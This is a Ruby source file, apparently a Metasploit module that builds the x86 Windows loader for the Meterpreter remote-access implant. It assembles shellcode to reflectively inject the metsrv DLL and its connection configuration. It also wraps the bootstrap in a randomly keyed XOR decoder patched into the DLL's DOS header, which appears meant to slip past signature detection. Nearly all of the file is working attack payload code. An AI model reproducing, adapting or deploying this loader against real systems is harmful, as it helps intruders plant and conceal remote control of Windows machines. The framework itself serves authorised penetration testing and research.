# -*- coding: binary -*-

require 'msf/core'
require 'msf/core/reflective_dll_loader'
require 'rex/payloads/meterpreter/config'

module Msf

###
#
# Common module stub for ARCH_X86 payloads that make use of Meterpreter.
#
###

module Payload::Windows::MeterpreterLoader

  include Msf::ReflectiveDLLLoader
  include Msf::Payload::Windows

  def initialize(info = {})
    super(update_info(info,
      'Name'          => 'Meterpreter & Configuration RDI',
      'Description'   => 'Inject Meterpreter & the configuration stub via RDI',
      'Author'        => [ 'sf', 'OJ Reeves' ],
      'References'    => [
        [ 'URL', 'https://github.com/stephenfewer/ReflectiveDLLInjection' ], # original
        [ 'URL', 'https://github.com/rapid7/ReflectiveDLLInjection' ] # customisations
      ],
      'Platform'      => 'win',
      'Arch'          => ARCH_X86,
      'PayloadCompat' => { 'Convention' => 'sockedi -https', },
      'Stage'         => { 'Payload'   => "" }
      ))
  end

  def asm_invoke_metsrv(opts={})
    asm = %Q^
        ; prologue
          push ebp              ; save ebp for later
          mov ebp, esp          ; set up a new stack frame
        ; Invoke ReflectiveLoader()
          ; add the offset to ReflectiveLoader() (0x????????)
          add ebx, #{"0x%.8x" % (opts[:rdi_offset] - 8)}
          call ebx              ; invoke ReflectiveLoader()
        ; Invoke DllMain(hInstance, DLL_METASPLOIT_ATTACH, config_ptr)
          ; offset from ReflectiveLoader() to the end of the DLL
          add ebx, #{"0x%.8x" % (opts[:length] - opts[:rdi_offset])}
    ^

    unless opts[:stageless]
      asm << %Q^
          mov [ebx], edi        ; write the current socket to the config
      ^
    end

    asm << %Q^
          push ebx              ; push the pointer to the configuration start
          push 4                ; indicate that we have attached
          push eax              ; push some arbitrary value for hInstance
          call eax              ; call DllMain(hInstance, DLL_METASPLOIT_ATTACH, config_ptr)
    ^
  end

  def stage_payload(opts={})
    stage_meterpreter(opts) + generate_config(opts)
  end

  def generate_config(opts={})
    ds = opts[:datastore] || datastore
    opts[:uuid] ||= generate_payload_uuid

    # create the configuration block, which for staged connections is really simple.
    config_opts = {
      arch:       opts[:uuid].arch,
      exitfunk:   ds['EXITFUNC'],
      expiration: ds['SessionExpirationTimeout'].to_i,
      uuid:       opts[:uuid],
      transports: opts[:transport_config] || [transport_config(opts)],
      extensions: []
    }

    # create the configuration instance based off the parameters
    config = Rex::Payloads::Meterpreter::Config.new(config_opts)

    # return the binary version of it
    config.to_b
  end

  def stage_meterpreter(opts={})
    # Exceptions will be thrown by the mixin if there are issues.
    dll, offset = load_rdi_dll(MetasploitPayloads.meterpreter_path('metsrv', 'x86.dll'))

    asm_opts = {
      rdi_offset: offset,
      length:     dll.length,
      stageless:  opts[:stageless] == true
    }

    asm = asm_invoke_metsrv(asm_opts)

    # generate the bootstrap asm
    bootstrap = Metasm::Shellcode.assemble(Metasm::X86.new, asm).encode_string

    # Add xor decoder
    xor = Rex::Encoding::Xor::Byte
    xor_key = rand(2**8)
    decoder = %Q^
      dec ebp               ; 'M'
      pop edx               ; 'Z'
      cld
      call $+5              ; call next instruction
      pop ebx               ; get the current location (+7 bytes)
      push edx              ; restore edx
      inc ebp               ; restore ebp
      mov esi, ebx
      add esi, 21
      mov ecx, #{bootstrap.length}
    decode:
      xor byte ptr [esi], #{"0x%.2x" % xor_key}
      add esi, 1
      loop decode
    ^
    xor_decoder = Metasm::Shellcode.assemble(Metasm::X86.new, decoder).encode_string
    print_status("Assembled decoder stub")

    # XOR the payload
    xor_payload = xor.encode(bootstrap, [xor_key].pack("C"))[0]
    print_status("XOR encoded bootstrap")

    # sanity check bootstrap length to ensure we dont overwrite the DOS headers e_lfanew entry
    total_length = bootstrap.length + xor_decoder.length
    if total_length > 62
      raise RuntimeError, "Meterpreter loader (x86) generated an oversized bootstrap!"
    end

    # patch the bootstrap code into the dll's DOS header...
    #dll[ 0, bootstrap.length ] = bootstrap
    print_status("Updating DLL with decoder and bootstrap")
    dll[ 0, xor_decoder.length ] = xor_decoder
    dll[ xor_decoder.length, bootstrap.length ] = xor_payload

    dll
  end

end

end

